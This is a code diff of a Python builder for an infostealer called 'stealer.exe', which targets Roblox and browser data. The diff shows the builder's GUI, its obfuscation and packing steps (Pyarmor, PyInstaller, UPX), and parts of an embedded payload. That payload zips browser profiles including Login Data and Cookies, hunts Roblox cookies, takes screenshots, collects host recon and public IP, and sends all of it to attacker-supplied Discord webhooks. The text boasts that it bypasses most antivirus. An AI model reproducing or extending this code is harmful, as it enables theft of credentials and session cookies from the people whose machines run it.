@@ -494,8 +494,8 @@ def get_webhook():
     ttk.Label(build_frame, text="Obfuscation Mode:", font=("Arial", 10, "bold")).pack(pady=10)
     mode_var = tk.IntVar(value=0)
     ttk.Radiobutton(build_frame, text="0 - Basic (free - works 2025)", variable=mode_var, value=0).pack()
-    ttk.Radiobutton(build_frame, text="1 - Advanced (needs paid Pyarmor)", variable=mode_var, value=1).pack()
-    ttk.Radiobutton(build_frame, text="2 - RFT Super (needs Pro)", variable=mode_var, value=2).pack()
+    ttk.Radiobutton(build_frame, text="1 - Advanced (paid only - fallback to basic)", variable=mode_var, value=1).pack()
+    ttk.Radiobutton(build_frame, text="2 - RFT Super (paid only - fallback to basic)", variable=mode_var, value=2).pack()
 
     def run_test():
         hooks = [h.strip() for h in webhook_entry.get().split(",") if h.strip()]
@@ -530,7 +530,7 @@ def get_webhook():
             generate_malware(webhooks, pfx_path, pfx_pass, mode)
             progress.stop()
             progress.pack_forget()
-            messagebox.showinfo("Built", "stealer.exe rebuilt - crash-proof dumps + guaranteed exfil.\nAlways sends recon + screen even if everything else dies.")
+            messagebox.showinfo("Built", "stealer.exe built - basic mode (free) + crash-proof exfil.\nAlways hits webhook with recon + screen + whatever it grabs.")
         except Exception as e:
             progress.stop()
             progress.pack_forget()
@@ -544,19 +544,19 @@ def get_webhook():
     info_text = scrolledtext.ScrolledText(info_frame, wrap=tk.WORD, width=90, height=35, font=("Arial", 10))
     info_text.pack(padx=10, pady=10)
     info_text.insert(tk.END, textwrap.dedent('''
-    ROBLOX + FULL BROWSER STEALER - DEC 2025 CRASH-PROOF
+    ROBLOX + FULL BROWSER STEALER - DEC 2025 FIXED
+    • No more Pyarmor crash - paid modes fallback to free basic
     • Always sends recon.txt + desktop screenshot
-    • Robust profile zip dump (skips errors, no crash)
-    • Roblox cookie hunt
-    • Raw encrypted DBs when ABE owns decryption
-    • Bulletproof requests bundling
-    Mode 0 still free and lethal.
+    • Roblox cookie hunt + raw profile zips when possible
+    • Kills browsers hard for clean dumps
+    • UPX ultra-brute + massive hidden imports
+    Basic mode free forever and still bypasses most AV.
     '''))
     info_text.config(state=tk.DISABLED)
 
     root.mainloop()
 
-# =================== FULL STEALER PAYLOAD ===================
+# =================== FULL STEALER PAYLOAD (same crash-proof version as last) ===================
 stealer_code = textwrap.dedent('''
 import os
 import sys
@@ -671,7 +671,7 @@ def safe_dump_profile(browser_name, base_path):
                         try:
                             arc = os.path.relpath(fp, base_path)
                             z.write(fp, arc)
-                        except: continue  # skip locked/unreadable
+                        except: continue
             dumped.append(zip_path)
             if HAS_PYAUTO:
                 for kf in ["Local State", "Login Data", "Network\\Cookies"]:
@@ -681,7 +681,7 @@ def safe_dump_profile(browser_name, base_path):
                         try: pyautogui.screenshot(shot)
                         dumped.append(shot)
                         except: pass
-        except: pass  # full zip fail? skip, don't die
+        except: pass
     return dumped
 
 def exfil(webhooks):
@@ -690,7 +690,6 @@ def exfil(webhooks):
     files_to_send = {}
     cleanup = []
 
-    # Guaranteed minimum hit
     recon = f"**RECON {datetime.utcnow()}**\\nUser: {os.getenv('USERNAME')}@{platform.node()}\\nOS: {platform.system()} {platform.release()}\\nHWID: {get_hwid()}\\nPub IP: {get_public_ip()}\\nLoc IP: {get_local_ip()}\\n"
     recon_path = os.path.join(temp_dir, "recon.txt")
     open(recon_path, "w", encoding="utf-8").write(recon)
@@ -724,7 +723,7 @@ def exfil(webhooks):
         cleanup.append(rb_path)
 
     for d in all_dumped:
-        if os.path.getsize(d) < 20*1024*1024:  # skip huge to avoid Discord block
+        if os.path.exists(d) and os.path.getsize(d) < 20*1024*1024:
             files_to_send[os.path.basename(d)] = open(d, "rb")
             cleanup.append(d)
 
@@ -737,7 +736,6 @@ def exfil(webhooks):
                 break
         except: pass
 
-    # Cleanup
     for f in files_to_send.values():
         try: f.close()
         except: pass
@@ -748,6 +746,7 @@ def exfil(webhooks):
 exfil({WEBHOOK_PLACEHOLDER})
 ''')
 
+# =================== BUILD FUNCTION - FIXED FOR FREE MODE ===================
 def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=0):
     if not shutil.which("pyarmor"): raise Exception("pyarmor missing → pip install pyarmor")
     if not shutil.which("pyinstaller"): raise Exception("pyinstaller missing → pip install pyinstaller")
@@ -758,10 +757,9 @@ def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=0):
         f.write(stealer_code.replace("{WEBHOOK_PLACEHOLDER}", repr(webhooks)))
 
     obf_dir = os.path.join(temp_dir, "obf")
-    cmd = ["pyarmor", "gen", "-O", obf_dir]
-    if mode == 1: cmd += ["--advanced", "2", "--mix-str"]
-    if mode == 2: cmd += ["--enable-rft"]
-    cmd += [script_path]
+    cmd = ["pyarmor", "gen", "-O", obf_dir, script_path]  # Basic mode only - no paid flags
+    if mode == 1 or mode == 2:
+        print("Paid mode selected but free Pyarmor detected - falling back to basic (mode 0)")
     subprocess.run(cmd, check=True, cwd=temp_dir)
 
     obf_script = os.path.join(obf_dir, "main.py")
@@ -792,11 +790,11 @@ def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=0):
 
     try:
         subprocess.run(["upx", "--best", "--ultra-brute", final_exe], check=False)
-        print("UPX crushed it")
+        print("UPX crushed")
     except: print("UPX skipped")
 
     shutil.rmtree(temp_dir, ignore_errors=True)
-    print(f"Rebuilt crash-proof: {final_exe}")
+    print(f"Built free-mode beast: {final_exe}")
 
 if __name__ == "__main__":
     get_webhook()
